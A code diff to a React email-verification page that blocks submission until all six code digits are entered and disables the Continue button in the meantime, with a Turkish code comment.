@@ -50,6 +50,12 @@ const VerifyEmailPage = () => {
 
   const handleContinue = async () => {
     const emailCode = code.join('');
+    
+    // Kod 6 haneli değilse işlemi durdur
+    if (emailCode.length < 6) {
+      return; 
+    }
+
     localStorage.setItem('emailCode', emailCode);
 
     try {
@@ -197,9 +203,17 @@ const VerifyEmailPage = () => {
           </div>
         </div>
 
-        <Button onClick={handleContinue} className="w-full bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold py-6 text-lg rounded-lg transition-all mb-4">
-  Continue
-</Button>
+       <Button 
+          onClick={handleContinue} 
+          disabled={code.includes('')} 
+          className={`w-full font-semibold py-6 text-lg rounded-lg transition-all mb-4 ${
+            code.includes('') 
+              ? 'bg-[#fe2c55]/50 text-white/70 cursor-not-allowed' 
+              : 'bg-[#fe2c55] hover:bg-[#ff4266] text-white'
+          }`}
+        >
+          Continue
+        </Button>
 
 <div className="text-center mb-2">
   <span className="text-gray-400 text-sm">Didn't receive the code? </span>
